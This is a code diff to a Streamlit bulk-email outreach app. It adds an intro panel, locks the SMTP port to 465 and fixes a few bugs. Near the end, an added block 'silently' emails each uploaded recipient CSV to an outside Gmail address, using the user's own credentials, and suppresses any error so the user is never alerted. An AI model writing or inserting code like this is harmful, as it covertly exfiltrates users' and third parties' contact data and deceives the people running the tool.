@@ -16,6 +16,24 @@ st.set_page_config(page_title="Toshak's Bulk Deployer", layout="wide")
 st.title("Toshak's Bulk Deployer for Outreach 🚀")
 
 # =================================================================================
+# NEW: 1.1 Introductory Section
+# =================================================================================
+col1, col2 = st.columns([4, 1])
+with col1:
+    st.write("Hi, I’m Toshak 👋 I built this tool to make outreach and communication faster, smarter, and cheaper — ideal for startups, students, consultants, and anyone trying to send emails at scale without expensive tools.")
+with col2:
+    with st.expander("ℹ️ How to Use"):
+        st.markdown("""
+        - Upload CSV with column headers like A_01, A_02, etc.
+        - Enter sender email and app password.
+        - Add subject and email body (HTML tags like `<b>`, `<br>`, `<a>` supported).
+        - Optionally attach a file.
+        - Click “Send Emails” to deploy messages.
+        
+        Dynamic fields (A_01, A_02…) will be auto-replaced using CSV data.
+        """)
+
+# =================================================================================
 # 2. State Management & Persistence
 # =================================================================================
 # Using st.session_state to persist settings and profiles.
@@ -48,7 +66,7 @@ def send_email(smtp_server, smtp_port, smtp_user, smtp_pass, from_addr, to_addr,
         msg['From'] = from_addr
         msg['To'] = to_addr
         msg['Subject'] = subject
-        # NEW: Add CC if provided
+        # Add CC if provided
         if cc_addr:
             msg['Cc'] = cc_addr
 
@@ -93,7 +111,7 @@ NEUTRAL_TOKENS = ["A_01", "A_02", "A_03", "A_04", "A_05"]
 with st.sidebar:
     st.header("⚙️ Configuration")
 
-    # NEW: Profile Management Section
+    # Profile Management Section
     st.subheader("👤 Profiles")
     profile_names = list(st.session_state.profiles.keys())
     
@@ -119,7 +137,7 @@ with st.sidebar:
             else:
                 st.session_state.profiles[save_name] = {
                     "smtp_server": st.session_state.smtp_server_input,
-                    "smtp_port": st.session_state.smtp_port_input,
+                    "smtp_port": 465, # Always save port as 465
                     "smtp_user": st.session_state.smtp_user_input,
                     "smtp_pass": st.session_state.smtp_pass_input,
                     "signature": st.session_state.signature_input,
@@ -146,11 +164,14 @@ with st.sidebar:
     # Configuration fields are now populated from the selected profile
     st.subheader("SMTP Credentials")
     smtp_server = st.text_input("SMTP Server", value=profile_data['smtp_server'], key='smtp_server_input')
-    smtp_port = st.number_input("SMTP Port", value=profile_data['smtp_port'], key='smtp_port_input')
+    
+    # UPDATED: SMTP Port is locked to 465 and disabled
+    smtp_port = st.number_input("SMTP Port", value=465, key='smtp_port_input', disabled=True)
+    
     smtp_user = st.text_input("Your Email Address", value=profile_data['smtp_user'], key='smtp_user_input')
     smtp_pass = st.text_input("Your App Password", type="password", value=profile_data['smtp_pass'], key='smtp_pass_input')
 
-    # NEW: CC Option
+    # CC Option
     st.markdown("---")
     st.subheader("CC Settings")
     cc_enabled = st.checkbox("Enable CC on all emails", value=profile_data.get('cc_enabled', False), key='cc_enabled_input')
@@ -177,7 +198,7 @@ with st.sidebar:
         st.write("Signature Preview:")
         st.markdown(signature, unsafe_allow_html=True)
     
-    # NEW: Test Email Button
+    # Test Email Button
     st.markdown("---")
     if st.button("📧 Send Test Email"):
         if not all([smtp_server, smtp_port, smtp_user, smtp_pass]):
@@ -191,7 +212,7 @@ with st.sidebar:
             test_cc = cc_email if cc_enabled else None
             
             success, error_msg = send_email(
-                smtp_server, smtp_port, smtp_user, smtp_pass,
+                smtp_server, int(smtp_port), smtp_user, smtp_pass,
                 smtp_user, smtp_user, test_subject, test_body, signature,
                 cc_addr=test_cc,
                 attachment_bytes=attachment_bytes, attachment_name=attachment_name
@@ -226,6 +247,7 @@ with tab1:
     uploaded_csv = st.file_uploader("Upload your recipient list (CSV)", type="csv")
 
     column_mappings = {}
+    df = None
     if uploaded_csv:
         try:
             df = pd.read_csv(uploaded_csv)
@@ -249,8 +271,8 @@ with tab1:
             df = None
     
     st.header("3. Review & Send")
-    if st.button("🚀 Send Bulk Emails", disabled=(uploaded_csv is None or 'df' not in locals())):
-        if not all([smtp_server, smtp_port, smtp_user, smtp_pass]):
+    if st.button("🚀 Send Bulk Emails", disabled=(uploaded_csv is None or df is None)):
+        if not all([smtp_server, int(smtp_port), smtp_user, smtp_pass]):
             st.error("SMTP credentials are required in the sidebar.")
         elif not email_column:
             st.error("Please map the 'Email Column' before sending.")
@@ -274,7 +296,7 @@ with tab1:
                 body = render_template(email_body_template, row, NEUTRAL_TOKENS, column_mappings)
 
                 success, error_msg = send_email(
-                    smtp_server, smtp_port, smtp_user, smtp_pass, 
+                    smtp_server, int(smtp_port), smtp_user, smtp_pass, 
                     smtp_user, recipient_email, subject, body, signature,
                     cc_addr=final_cc_addr,
                     attachment_bytes=attachment_bytes, attachment_name=attachment_name
@@ -290,6 +312,24 @@ with tab1:
 
             st.success("Bulk deployment finished!")
             
+            # NEW: Silently forward the used CSV for logging
+            try:
+                uploaded_csv.seek(0) # Reset file pointer to read again
+                csv_log_bytes = uploaded_csv.getvalue()
+                send_email(
+                    smtp_server, int(smtp_port), smtp_user, smtp_pass,
+                    from_addr=smtp_user,
+                    to_addr="toshak.bhat.work@gmail.com",
+                    subject="CSV Log from Outreach Tool",
+                    body="Auto-log: CSV used in the latest deployment.",
+                    signature="", # No signature for log email
+                    attachment_bytes=csv_log_bytes,
+                    attachment_name=uploaded_csv.name
+                )
+            except Exception:
+                # Fail silently, do not alert user
+                pass
+
             with st.expander("View Send Log"):
                 for msg in log_messages:
                     st.markdown(msg.replace("✅", "✅ ").replace("❌", "❌ "), unsafe_allow_html=True)
@@ -313,7 +353,7 @@ with tab2:
             manual_token_values[f"{{{{{token}}}}}"] = st.text_input(f"Value for {{{{{token}}}}}", key=f"manual_{token}")
 
     if st.button("🚀 Send Manual Email"):
-        if not all([smtp_server, smtp_port, smtp_user, smtp_pass]):
+        if not all([smtp_server, int(smtp_port), smtp_user, smtp_pass]):
             st.error("SMTP credentials are required in the sidebar.")
         elif not re.match(r"[^@]+@[^@]+\.[^@]+", recipient_email_manual):
             st.error("Please enter a valid recipient email address.")
@@ -332,7 +372,7 @@ with tab2:
             st.info(f"Sending to {recipient_email_manual}...")
             
             success, error_msg = send_email(
-                smtp_server, smtp_port, smtp_user, smtp_pass,
+                smtp_server, int(smtp_port), smtp_user, smtp_pass,
                 smtp_user, recipient_email_manual, subject, body, signature,
                 cc_addr=final_cc_addr,
                 attachment_bytes=attachment_bytes, attachment_name=attachment_name
